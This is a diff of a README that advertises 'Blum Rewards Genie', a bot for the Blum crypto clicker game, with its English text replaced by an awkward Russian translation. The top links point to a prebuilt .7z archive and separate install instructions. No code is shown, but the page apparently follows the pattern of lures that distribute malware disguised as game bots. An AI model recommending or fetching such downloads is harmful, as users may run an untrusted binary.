@@ -1,26 +1,24 @@
-# [DOWNLOAD!](https://github.com/tiverrubix/Blum-New-Autofarming-Method/releases/download/Download/Blum_Aurtofarm_x64_x86.7z)
-# [Click here to view installation instructions](https://github.com/tiverrubix/Blum-New-Autofarming-Method/blob/main/Installation%20instructions.txt)
+# [Скачать!](https://github.com/tiverrubix/Blum-New-Autofarming-Method/releases/download/Download/Blum_Aurtofarm_x64_x86.7z)
+# [Нажмите здесь, чтобы ознакомиться с инструкциями по установке](https://github.com/tiverrubix/Blum-New-Autofarming-Method/blob/main/Installation%20instructions.txt)
 
 
-### Blum Rewards Genie: Effortless Rewards for Your Blum Adventures 💰✨
+### Blum Rewards Genie: Легкие награды за ваши приключения в Blum 💰✨
 
-### Embark on a seamless Blum journey with Blum Rewards Genie, the ultimate automation tool for the captivating hybrid exchange and clicker game. Unlock rewards with ease and focus on your strategic gameplay, while the genie takes care of the mundane tasks.
+### Отправляйтесь в увлекательное путешествие по Blum с Blum Rewards Genie, совершенным инструментом автоматизации для увлекательной гибридной игры в жанре обмена и кликера. С легкостью получайте награды и сосредоточьтесь на стратегическом игровом процессе, в то время как genie позаботится о повседневных задачах.
 
-## Key Features:
+## Ключевые функции:
 
-- 🤖 Automated Farming: Initiate farming sessions every 8 hours, ensuring you never miss an opportunity to earn Blum Points.
-- 🎁 Reward Collector: Automatically claim rewards from daily tasks, maximizing your earnings without lifting a finger.
-- 🕹️ Intuitive Interface: Configure and operate the genie with a user-friendly interface, making automation a breeze.
+- 🤖 Автоматизированное земледелие: Проводите сеансы земледелия каждые 8 часов, чтобы никогда не упустить возможность заработать очки Blum.
+- 🎁 Сборщик вознаграждений: Автоматически получайте вознаграждение за выполнение ежедневных заданий, увеличивая свой заработок, не пошевелив и пальцем.
+- 🕹️ Интуитивно понятный интерфейс: Настраивайте и управляйте genie с помощью удобного интерфейса, что упрощает автоматизацию.
 
+## Параметры настройки:
 
-## Customization Options:
+- ⏰ Планировщик ведения сельского хозяйства: установите интервал ведения сельского хозяйства в соответствии с вашим расписанием, обеспечивая оптимальный сбор ресурсов.
+- 📋 Менеджер задач: Выберите конкретные ежедневные задания для джинна, которые он должен выполнить, чтобы максимально увеличить свое вознаграждение.
 
-- ⏰ Farming Scheduler: Set the farming interval to match your schedule, ensuring optimal resource collection.
-- 📋 Task Manager: Select specific daily tasks for the genie to complete, maximizing your reward earnings.
+## Лицензирование и благодарности:
 
-## Licensing and Acknowledgements:
+Этот проект имеет лицензию GPLv3.
 
-This project is licensed under the GPLv3.
-
-We express our gratitude to the creators of Blum for crafting an engaging and rewarding game experience. Our inspiration stems from the desire to enhance the gameplay for Blum enthusiasts by simplifying the reward collection process.
-
+Мы выражаем нашу благодарность создателям Blum за создание увлекательной и полезной игры. Наше вдохновение проистекает из желания улучшить игровой процесс для энтузиастов Blum, упростив процесс получения вознаграждения.
